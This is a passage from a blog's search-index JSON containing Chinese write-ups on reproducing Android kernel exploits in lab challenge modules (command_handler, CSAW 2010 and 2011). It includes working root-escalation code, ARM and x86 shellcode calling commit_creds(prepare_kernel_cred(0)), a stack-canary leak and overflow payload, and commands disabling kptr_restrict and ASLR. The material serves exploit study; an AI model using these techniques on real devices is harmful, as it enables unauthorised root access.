//先将prepare_kernel_creds的位置放入r3，在把参数赋为0，即prepare_kernel_creds（0） //调用r3内的函数（即prepare_kernel_creds）后，由于r0同时担当了保存返回值的角色，于是只需将接下来调用的寄存器赋为commit_creds即可 __u32 jump[] = { //00000000 &lt;_start&gt;: /* 0:*/ 0xe92d4010, // push {r4, lr} /* 4:*/ 0xe59f3010, // ldr r3, [pc, #16] ; 1c &lt;_start+0x1c&gt; (prepare_kernel_creds) /* 8:*/ 0xe3a00000, // mov r0, #0 /* c:*/ 0xe12fff33, // blx r3 /* 10:*/ 0xe59f3008, // ldr r3, [pc, #8] ; 20 &lt;_start+0x20&gt; (commit_creds) /* 14:*/ 0xe12fff33, // blx r3 /* 18:*/ 0xe8bd8010, // pop {r4, pc} /* 1c:*/ prepare_kernel_cred, // .word prepare_kernel_cred /* 20:*/ commit_creds // .word commit_creds }; memcpy( (void*)mmap_start+mmap_size - sizeof(jump), jump, sizeof(jump)); /*这里看一下触发的函数吧,都是OOB，但是没那么复杂，不需要构造socket交互，而是换为了ioctl CommandHandler handlers[] = { { .runHandler = &amp;doNothingIntializer }, { .runHandler = &amp;doNothingIntializer } }; long ai_ch_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { unsigned int handler_index = arg; switch (cmd) { case RUN_COMMAND_HANDLER: handlers[handler_index].runHandler(); break; default : printk(&quot;Unknown ioctl cmd: %d&quot;, cmd); return -1; } return 0; }*/ printf(&quot;[+] Triggering the exploit\\n&quot;); int rc = ioctl(cmd_handler, RUN_COMMAND_HANDLER, 0x601); check(rc != -1, &quot;IOCTL failed&quot;); printf(&quot;uid=%d, euid=%d\\n&quot;,getuid(), geteuid() ); if(!getuid()) execl( &quot;/system/bin/sh&quot;, &quot;sh&quot;, (char*) NULL); return 0; error: return -1;} 最后运行时需要注意，不要用串了。。。我一开始用错一个exp，直接用了exploit-db上的exp，而其对应的linux内核版本是3.3-3.8，而在Android模拟器上复现的话，还是用ndk编译，且具体的数据构造和exp内容（特别是汇编部分）还是不一样的，注意查看下对应的系统结构比如下面这个，注意对应的gcc版本，一开始没注意还运行不起来。。。 1Linux version 3.4.67-g5e0dcfb (test@test-virtual-machine) (gcc version 4.6.x-google 20120106 (prerelease) (GCC) ) #1 PREEMPT Sun Mar 8 14:27:12 CST 2020 执行后程序报错，可能还是有些不准，pc值是0有些迷惑。。 123456789101112131415161718192021Unable to handle kernel NULL pointer dereference at virtual address 00000000pgd = d77c4000[00000000] *pgd=177bc831, *pte=00000000, *ppte=00000000Internal error: Oops: 80000017 [#1] PREEMPT ARMCPU: 0 Not tainted (3.4.67-g5e0dcfb #1)PC is at 0x0LR is at ai_ch_ioctl+0x20/0x40pc : [&lt;00000000&gt;] lr : [&lt;c025c1c0&gt;] psr: 60000013sp : d77a3f18 ip : 00000005 fp : bec41b48r10: 00000000 r9 : d77a2000 r8 : 00000000r7 : 00000005 r6 : d768cc80 r5 : de05d590 r4 : 00000601r3 : 00000000 r2 : c04adc40 r1 : 00001337 r0 : d768cc80Flags: nZCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment userControl: 10c53c7d Table: 177c4059 DAC: 00000015[&lt;c025c1c0&gt;] (ai_ch_ioctl+0x20/0x40) from [&lt;c00bf208&gt;] (do_vfs_ioctl+0x560/0x5d4)[&lt;c00bf208&gt;] (do_vfs_ioctl+0x560/0x5d4) from [&lt;c00bf2c8&gt;] (sys_ioctl+0x4c/0x6c)[&lt;c00bf2c8&gt;] (sys_ioctl+0x4c/0x6c) from [&lt;c000d680&gt;] (ret_fast_syscall+0x0/0x30)Code: bad PC value---[ end trace 6e436d5d54b1e15f ]---Kernel panic - not syncing: Fatal exception 未完待续吧，这个库里面还是有很多其他漏洞的，也推荐给想做arm上kernel漏洞复现的同学，但可能给android上的体会不太深，比较和Linux内核类似，且这次踩坑的时候心态有些炸了，具体的调试分析也直接草草分析过掉，希望下次能好些吧，争取复现下其他层次的漏洞。唉，漫漫长路啊。。。","link":"/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/"},{"title":"android kernel exploit第二弹","text":"command_handler这个漏洞是对类中某指针函数的覆盖，从而在调用该指针函数时劫持，从而执行任意代码 结构体在commandhandler.h文件中，如下： 123typedef struct { int (* runHandler)(void);} CommandHandler; 首先看下源码的问题，漏洞出在write_to_vuln_device函数： 123456789ssize_t write_to_vuln_device(struct file *filp, const char * buf, size_t count, loff_t *f_pos){ int ret = copy_from_user(&amp;handler,buf,sizeof(CommandHandler)); if(ret){ printk(&quot;Failed to copy %d bytes&quot;, ret); return ret; } return 0;} 这个函数会使用copy_from_user从buf中读取CommandHandler大小的字节地址到handler的地址中，而这个handler其实也是个CommandHandler结构体,且其内部函数指针指向的函数功能只是返回0。 1234567CommandHandler handler = { .runHandler = &amp;doNothingIntializer};static int doNothingIntializer(){ return 0;} 那比较明显了，那就比较明显了，如果我们传入的buf的头四个字节是自己设定好的地址的话，那么我们就可以在handler的runHandler函数被调用时，就可以将程序流劫持了。 那是在哪里触发的呢？程序中有这样的一段代码： 1234567891011121314151617181920212223242526long device_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){ switch (cmd) { case RUN_COMMAND_HANDLER: handler.runHandler(); break; default : printk(&quot;Unknown ioctl cmd: %d&quot;, cmd); return -1; } return 0;}struct file_operations device_ops = { read: read_from_vuln_device, write: write_to_vuln_device, unlocked_ioctl: device_ioctl};static struct miscdevice vuln_device = { minor: MISC_DYNAMIC_MINOR, name: &quot;cmd_handler&quot;, // Name ourselves /dev/string_format fops: &amp;device_ops, //Struct for the file ops handler mode: 666}; 可以看到当我们在对该模块（即cmd_handler)调用write，ioctl函数时，该模块就会将这两个函数替换成自己的漏洞函数了，也就是说我们可以先调用write函数，使其触发write_to_vuln_device去覆盖runhandler地址（这里说一点能覆盖的原因是结构体的首地址和第一项内容的起始地址相同，且大小相同），然后再调用unlocked_ioctl触发调用runHandler（kernel 2.6.36 中已经完全删除了struct file_operations 中的ioctl 函数指针，取而代之的是unlocked_ioctl） 看下exp的核心部分，这里的getsymbol函数即打开/proc/kallsyms去获取相应字符串的地址而已： 123456789101112131415161718192021222324252627282930313233int run_handler(){ commit_creds(prepare_kernel_cred(0)); return 0;}int main(void){ commit_creds = (int (*)(unsigned long)) get_symbol(&quot;commit_creds&quot;); prepare_kernel_cred = (unsigned long(*)(unsigned long)) get_symbol(&quot;prepare_kernel_cred&quot;); CommandHandler ch = { .runHandler = &amp;run_handler }; printf(&quot;[+] RunHandler at 0x%x\\n&quot;, (unsigned int) &amp;run_handler); int cmd_handler = open(&quot;/dev/cmd_handler&quot;, O_RDWR); check(cmd_handler &gt;= 0, &quot;Error opening challenge device&quot;); int rc = write(cmd_handler, &amp;ch, sizeof(CommandHandler)); check(rc &gt;= 0, &quot;Error writing to challenge device&quot;); #define RUN_COMMAND_HANDLER 0x1337 rc = ioctl(cmd_handler, RUN_COMMAND_HANDLER, NULL); check(rc != -1, &quot;IOCTL failed&quot;); printf(&quot;uid=%d, euid=%d\\n&quot;,getuid(), geteuid() ); if(!getuid()) execl( &quot;/system/bin/sh&quot;, &quot;sh&quot;, (char*) NULL); return 0; error: return -1;} 调试过程如下，省略部分步骤，分析一同写在里面了。先挂起gdb，然后执行./build_and_run.sh程序，注意由于我们exp需要commit_creds和prepare_kernel_cred地址，所以可以用adb shell进去echo 0 &gt; /proc/sys/kernel/kptr_restrict, 同时关闭随机化echo 0 &gt; /proc/sys/kernel/randomize_va_space 在几个重要函数下断点，并来到write_to_vuln_device，此时对应着exp是执行到了write这一句 1234567891011(gdb) b write_to_vuln_deviceBreakpoint 5 at 0xc025be28: file drivers/vulnerabilities/kernel_build/../challenges/command_handler/module/CommandHandler.c, line 29.(gdb) b device_ioctlBreakpoint 6 at 0xc025be90: file drivers/vulnerabilities/kernel_build/../challenges/command_handler/module/CommandHandler.c, line 41.(gdb) cContinuing.Breakpoint 5, write_to_vuln_device (filp=0xd1811680, buf=0xbefffab8 &quot;5\\203&quot;, count=4, f_pos=0xd186bf88) at drivers/vulnerabilities/kernel_build/../challenges/command_handler/module/CommandHandler.c:2929 { 可以发现程序用来覆盖的值应该是0x8335，也就是run_handler()的函数地址，但是现在无法查看 1234(gdb) x/10xw 0xbefffab80xbefffab8: 0x00008335 0x8e6a2130 0x0004d5a8 0x6474e5520xbefffac8: 0x00000fff 0x00008743 0x00000001 0xbefffb540xbefffad8: 0xbefffb5c 0xbefffb9c 步进到copy_from_user，查看填入地址和其内容发现确实是handler和runhandler，且此时from地址的值就是0x00008335 123456789101112131415copy_from_user (n=4, from=0xbefffab8, to=0xc04ac2fc) at /home/test/Desktop/kernel_pwn/playground/goldfish/arch/arm/include/asm/uaccess.h:421421 n = __copy_from_user(to, from, n);(gdb) x/10xw 0xc04ac2fc0xc04ac2fc &lt;handler&gt;: 0xc025be18 0x0000003a 0xc041ddc1 0xc04ac3240xc04ac30c &lt;vuln_device+12&gt;: 0xc04ac2dc 0xc04ac3bc 0x00000000 0xdeaa61c00xc04ac31c &lt;vuln_device+28&gt;: 0x00000000 0x0000029a(gdb) x/10xw 0xc025be180xc025be18 &lt;doNothingIntializer&gt;: 0xe3a00000 0xe12fff1e 0xe3a00000 0xe12fff1e0xc025be28 &lt;write_to_vuln_device&gt;: 0xe92d4010 0xe1a0200d 0xe3c23d7f 0xe59f004c0xc025be38 &lt;write_to_vuln_device+16&gt;: 0xe3c3303f 0xe5933008(gdb) x/10xw 0xbefffab80xbefffab8: 0x00008335 0x8e6a2130 0x0004d5a8 0x6474e5520xbefffac8: 0x00000fff 0x00008743 0x00000001 0xbefffb540xbefffad8: 0xbefffb5c 0xbefffb9c 来到device_ioctl，此时对应着exp应该是调用了ioctl函数所以触发到这里，查看runhandler地址已被覆盖为0x00008335，同时查看传入的cmd为0x1337正好对应着RUN_COMMAND_HANDLER的值，所以接下来会触发handler.runhandler() 123456789Breakpoint 6, device_ioctl (filp=0xd1811680, cmd=4919, arg=0) at drivers/vulnerabilities/kernel_build/../challenges/command_handler/module/CommandHandler.c:4141 {(gdb) x/10xw 0xc04ac2fc0xc04ac2fc &lt;handler&gt;: 0x00008335 0x0000003a 0xc041ddc1 0xc04ac3240xc04ac30c &lt;vuln_device+12&gt;: 0xc04ac2dc 0xc04ac3bc 0x00000000 0xdeaa61c00xc04ac31c &lt;vuln_device+28&gt;: 0x00000000 0x0000029a(gdb) p/x 4919$1 = 0x1337 步进到handler.runHandler()后查看下其汇编函数，发现pc即将跳转到寄存器r3指向的地址，查看下r3的值，发现就是我们劫持填入的地址，这里直接看0x8335的内容识别不了，但可以根据在exp中打印出我们所写的提权函数run_handler的地址，发现也是0x8335，因此可以得知跳转到了我们的函数。（当然也可以尝试下反汇编，这里我就不试了) 12345678910111213141516171819202122232425262728(gdb)0xc025bea8 44 handler.runHandler();(gdb) disassDump of assembler code for function device_ioctl: 0xc025be90 &lt;+0&gt;: push {r3, lr} 0xc025be94 &lt;+4&gt;: movw r3, #4919 ; 0x1337 0xc025be98 &lt;+8&gt;: cmp r1, r3 0xc025be9c &lt;+12&gt;: bne 0xc025beb4 &lt;device_ioctl+36&gt; 0xc025bea0 &lt;+16&gt;: ldr r3, [pc, #28] ; 0xc025bec4 0xc025bea4 &lt;+20&gt;: ldr r3, [r3]=&gt; 0xc025bea8 &lt;+24&gt;: blx r3 0xc025beac &lt;+28&gt;: mov r0, #0 0xc025beb0 &lt;+32&gt;: pop {r3, pc} 0xc025beb4 &lt;+36&gt;: ldr r0, [pc, #12] ; 0xc025bec8 0xc025beb8 &lt;+40&gt;: bl 0xc0362f60 &lt;printk&gt; 0xc025bebc &lt;+44&gt;: mvn r0, #0 0xc025bec0 &lt;+48&gt;: pop {r3, pc} 0xc025bec4 &lt;+52&gt;: strdgt r12, [r10], #-44 ; 0xffffffd4 0xc025bec8 &lt;+56&gt;: subgt sp, r1, r3, lsl #27End of assembler dump.(gdb) p/x $r3$3 = 0x8335(gdb) disass 0x8335No function contains specified address.(gdb) x/10xw 0x83350x8335: 0x06af02b5 0x78490748 0x00447944 0x046809680x8345: 0x09200068 0xa0478868 0xd0200047 0x58bf00bd0x8355: 0x5a00046b 0xbf00046b 最终利用成功如下 12345678910[arm64-v8a] Install : solution =&gt; libs/arm64-v8a/solution[x86_64] Install : solution =&gt; libs/x86_64/solution[armeabi-v7a] Install : solution =&gt; libs/armeabi-v7a/solution[x86] Install : solution =&gt; libs/x86/solution1182 KB/s (292168 bytes in 0.241s)[+] resolved symbol commit_creds to 0xc0039834[+] resolved symbol prepare_kernel_cred to 0xc0039d34[+] RunHandler at 0x8335uid=0, euid=0root@generic:/ # csaw 2010这题的漏洞是栈溢出，但是要绕过canary，这题提供了一种绕过canary的方法。 原理是由于proc接口就像提供了一个文件的接口，因此可以对proc目录下的打开的文件描述符调用lseek函数，从而导致传递给csaw_read函数的off参数可以是非零值。通过这个属性我们可以在进程中dump出canary的值后将它填入具体位置绕过。利用如下，具体的偏移值（如canary和ret的距离）可以通过动态调试确定： 123456789101112131415161718192021222324252627282930void trigger_vuln(int fd, int canary){ #define MAX_PAYLOAD (MAX + 1 * sizeof(void*) ) char buf[MAX_PAYLOAD], *p; bzero(buf, sizeof(buf)); // memset(buf, 'A', sizeof(buf)); p = buf + MAX; *(void **)p = (void *)canary; p += 7 * sizeof(void *); *(void **)p = (void *) &amp;kernel_code; /* Point p to the canary's spot and set it. */ printf(&quot;Payload:\\n&quot;); print_hex(buf, sizeof(buf)); printf(&quot;[*] hold on to your butts\\n&quot;); /* Kaboom! */ write(fd, buf, sizeof(buf));}int gather_information(int fd){ int canary, i; if (lseek(fd, 32, SEEK_SET) == -1) err(2, &quot;lseek&quot;); read(fd, &amp;canary, sizeof(canary)); printf(&quot;[+] found canary: %08x\\n&quot;, canary); return canary;} csaw 2011这题很迷。。。调到后面才发现结构体不一样。。。但还是学到些东西的 简单说下原理：在Linux上，系统上的每个线程都在内核内存中分配了相应的内核堆栈。 x86上的Linux内核堆栈的大小为4096或8192字节。尽管此大小似乎很小，无法包含完整的调用链和相关的本地堆栈变量，但实际上内核调用链相对较浅，当使用高效的分配器（如SLUB）时，不鼓励内核函数滥用带有大局部堆栈变量的宝贵空间。可用。堆栈与thread_info结构共享4k / 8k的总大小，该结构包含有关当前线程的一些元数据，如include/linux/sched.h中所示： 1234union thread_union { struct thread_info thread_info; unsigned long stack[THREAD_SIZE/sizeof(long)];}; 根据题目的提示的信息，我们可以对应到linux v2.6.39.4的版本然后在x86下的thread_info的结构是这样的： 12345678910111213141516171819struct thread_info { struct task_struct *task; /* main task structure */ struct exec_domain *exec_domain; /* execution domain */ __u32 flags; /* low level flags */ __u32 status; /* thread synchronous flags */ __u32 cpu; /* current CPU */ int preempt_count; /* 0 =&gt; preemptable, &lt;0 =&gt; BUG */ mm_segment_t addr_limit; struct restart_block restart_block; void __user *sysenter_return;#ifdef CONFIG_X86_32 unsigned long previous_esp; /* ESP of the previous stack in case of nested (IRQ) stacks */ __u8 supervisor_stack[0];#endif int uaccess_err;}; 由于内核内存空间有限，当内核中的函数需要超过4k / 8k的堆栈空间或长调用链超出可用堆栈空间时，那么就会发生堆栈溢出，并且如果thread_info结构或超出其的关键内存损坏，则常会导致内核崩溃。但是如果可以对齐其结构体，并且存在实际可以控制写入堆栈及其以外的数据的情况，则可能存在可利用的条件。这里的话，是将restart_block作为一个攻击切入点， restart_block是每个线程的结构，用于跟踪信息和参数以重新启动系统调用。如果在sigaction 中指定了SA_RESTART，则被信号中断的系统调用可以中止并返回EINTR，也可以自行重启。在include/linux/thread_info.h中，restart_block的定义如下： 12345678910111213141516171819202122232425262728293031struct restart_block { long (*fn)(struct restart_block *); union { /* For futex_wait and futex_wait_requeue_pi */ struct { u32 __user *uaddr; u32 val; u32 flags; u32 bitset; u64 time; u32 __user *uaddr2; } futex; /* For nanosleep */ struct { clockid_t clockid; struct timespec __user *rmtp;#ifdef CONFIG_COMPAT struct compat_timespec __user *compat_rmtp;#endif u64 expires; } nanosleep; /* For poll */ struct { struct pollfd __user *ufds; int nfds; int has_timeout; unsigned long tv_sec; unsigned long tv_nsec; } poll; };}; 需要关注的是第一个函数指针，先来看下是否可以触发这个指针，在kernel/signal.c中发现可以通过restart_syscall函数来调用restart_block的fn指向的函数 12345SYSCALL_DEFINE0(restart_syscall){ struct restart_block *restart = &amp;current_thread_info()-&gt;restart_block; return restart-&gt;fn(restart);} 而在arch/x86/kernel/syscall_table_32.S中定义了restart_syscall的系统调用号： 1.long sys_restart_syscall /* 0 - old &quot;setup()&quot; system call, used for restarting */ 也就是说我们可以通过syscall（0）就能触发到这个fn指向的函数了，那如果可以破坏thread_info的restart_block成员中的函数指针，将其指向我们控制下的用户空间中的函数，那么就可以劫持程序流了。 以上就是大致的原理部分，程序本身是一个加密解密模块，这不是我们关注的重点，重点在于我们是否能够在内核空间将使用地址覆盖到thread_info，直接分配大空间内存在这里无法实现，所以考虑不断分配栈帧，即找寻递归函数，在decrypt函数我们看到了一个decrypt自身的递归调用，比较明显的是round的值代表了控制解密的轮数，在这里也就是分配栈帧的次数，如果我们可以控制这个round为一个合适的较大值，那么我们就可以覆盖到thread_info了 12345678910111213141516171819202122voiddecrypt(uint32_t k[], char *buf, int len, int rounds){ int i; if (rounds &gt;= 0) { if (rounds % 3 == 0) { k[0] ^= k[1]; k[1] ^= k[0]; k[0] ^= k[1]; k[2] ^= k[3]; k[3] ^= k[2]; k[2] ^= k[3]; } else if (rounds % 3 == 1) { k[0] ^= k[2]; k[2] ^= k[0]; k[0] ^= k[2]; k[1] ^= k[3]; k[3] ^= k[1]; k[1] ^= k[3]; } else if (rounds % 3 == 2) { k[0] ^= k[3]; k[3] ^= k[0]; k[0] ^= k[3]; k[2] ^= k[1]; k[1] ^= k[2]; k[2] ^= k[1]; } decrypt(k, buf, len, rounds-1); } else { for (i = 0; i &lt; len / 8; i++) { descramble(k, (uint32_t *)(buf + (i * 8)), (uint32_t *) 0, (uint32_t *) DELTA); } }} 而这个round值在key_write函数中被赋值，可以看到从copy_from_user获取用户的输入，然后按照格式化字符串的填入key和rounds。 123456789101112131415intkey_write(struct file *file, const char __user *ubuf, unsigned long count, void *data){ char buf[MAX_LENGTH]; printk(KERN_INFO &quot;csaw: called key_write\\n&quot;); memset(buf, 0, sizeof(buf)); if (count &gt; MAX_LENGTH) { count = MAX_LENGTH; } if (copy_from_user(&amp;buf, ubuf, count)) { return -EFAULT; } sscanf(buf, &quot;%16c\\t%d&quot;, (char *) key, &amp;rounds); return count;} 填充rounds和触发的函数如下： 12345678910111213141516voidset_rounds(int rounds){ FILE *fp = open_file(&quot;/proc/csaw2011/key&quot;); fprintf(fp, &quot;FFFFFFFFFFFFFFFF\\t%d\\n&quot;, rounds); fclose(fp); printf(&quot;[+] Rounds set successfully\\n&quot;);}voidtrigger_vuln(void){ FILE *fp = open_file(&quot;/proc/csaw2011/decrypt&quot;); fprintf(fp, &quot;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&quot;); fclose(fp); syscall(0);} 当然有点无语的是具体shellcode填充，给了x86架构的exp，然而放在androidkernel的题库里。。。shellcode就是类似于jop的思路 12345678910111213141516171819202122/* This function just does: * asm(&quot;mov $get_root, %eax; jmp *%eax;&quot;); * * The format of these instructions is: * mov addr, %eax =&gt; b8 little_endian(addr) * jmp *%eax =&gt; ff e0 */voidgenerate_shellcode(char *buf){ long *p; *buf++ = '\\xb8'; /* mov $get_root, %eax */ p = (long *)buf; *p = (long)&amp;get_root; buf += sizeof(long *); /* jmp eax */ *buf++ = '\\xff'; *buf++ = '\\xe0';} 当我费心改成arm架构的机器码挂上去调试的时候，却突然发现不同架构的thread_info的结构体都不一样 :) 在linux之前的内核中，还没有lx的辅助调试选项，所以查看thread_info的方式要少麻烦些首先我们需要根据栈地址拿到thread_info的地址，上文根据thread_union结构体可知可以通过程序的局部变量的地址（&amp;retval）获得内核栈的地址。又因为thread_info 位于内核栈顶部而且是 8k（或者 4k ）对齐的，所以利用 栈地址 &amp; (~(THREAD_SIZE - 1)) 就可以计算出 thread_info 的地址。而THREAD_SIZE的定义在thread_info.h中, 下面是arm架构的THREAD_SIZE定义，THREAD_SIZE_ORDER和PAGE_SIZE根据架构有所不同，这里由于是arm 32位，所以THREAD_SIZE = 4096 * 2 = 0x2000 12#define THREAD_SIZE_ORDER 1#define THREAD_SIZE (PAGE_SIZE &lt;&lt; THREAD_SIZE_ORDER) 就是在调试时才发现原来thread_info的结构体也不一样，猝。。。 1234567891011121314151617181920212223242526(gdb) p/x $sp$10 = 0xd1c4fe88&gt;&gt;&gt; hex(sp&amp;(~(0x2000-1)))'0xd1c4e000'(gdb) p *(struct thread_info *) 0xd1c4e000$12 = {flags = 0, preempt_count = 0, addr_limit = 3204448256, task = 0xd1c38c00, exec_domain = 0xc048ca6c, cpu = 0, cpu_domain = 21, cpu_context = {r4 = 3725747072, r5 = 3519253504, r6 = 3226005544, r7 = 3615050560, r8 = 3726621696, r9 = 3519340544, sl = 3519340544, fp = 3519348100, sp = 3519348048, pc = 3224796784, extra = {0, 0}}, syscall = 0, used_cp = '\\000' &lt;repeats 15 times&gt;, tp_value = 3070189536, crunchstate = {mvdx = {{0, 0} &lt;repeats 16 times&gt;}, mvax = {{0, 0, 0}, {0, 0, 0}, {0, 0, 0}, {0, 0, 0}}, dspsc = {0, 0}}, fpstate = {hard = {save = { 0 &lt;repeats 35 times&gt;}}, soft = {save = {0 &lt;repeats 35 times&gt;}}}, vfpstate = { hard = {fpregs = {0 &lt;repeats 32 times&gt;}, fpexc = 1073741824, fpscr = 0, fpinst = 0, fpinst2 = 0}}, restart_block = {fn = 0xc0028dcc &lt;do_no_restart_syscall&gt;, {futex = { uaddr = 0x0, val = 0, flags = 0, bitset = 0, time = 0, uaddr2 = 0x0}, nanosleep = {clockid = 0, rmtp = 0x0, expires = 0}, poll = {ufds = 0x0, nfds = 0, has_timeout = 0, tv_sec = 0, tv_nsec = 0}}}}其结构体就不再放了，查看task_struct的话可以看到cred的地址, 然后查看cred内的id：(gdb) p *(struct task_struct *) 0xd1c38c00...real_cred = 0xde29be40, cred = 0xde29be40,...","link":"/2020/04/01/android%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BA%8C/"}],"tags":[{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"fuzz","slug":"fuzz","link":"/tags/fuzz/"},{"name":"notes","slug":"notes","link":"/tags/notes/"},{"name":"vul","slug":"vul","link":"/tags/vul/"}],"categories":[{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"fuzz","slug":"fuzz","link":"/categories/fuzz/"},{"name":"notes","slug":"notes","link":"/categories/notes/"},{"name":"pwn","slug":"ctf/pwn","link":"/categories/ctf/pwn/"},{"name":"kernel","slug":"fuzz/kernel","link":"/categories/fuzz/kernel/"},{"name":"env","slug":"notes/env","link":"/categories/notes/env/"},{"name":"linux","slug":"notes/linux","link":"/categories/notes/linux/"},{"name":"normal","slug":"fuzz/normal","link":"/categories/fuzz/normal/"},{"name":"hardware","slug":"notes/hardware","link":"/categories/notes/hardware/"},{"name":"vul","slug":"vul","link":"/categories/vul/"},{"name":"android","slug":"fuzz/android","link":"/categories/fuzz/android/"},{"name":"android","slug":"notes/android","link":"/categories/notes/android/"},{"name":"android","slug":"vul/android","link":"/categories/vul/android/"},{"name":"windows","slug":"vul/windows","link":"/categories/vul/windows/"},{"name":"software","slug":"vul/android/software","link":"/categories/vul/android/software/"},{"name":"software","slug":"vul/windows/software","link":"/categories/vul/windows/software/"},{"name":"kernel","slug":"vul/android/kernel","link":"/categories/vul/android/kernel/"}]}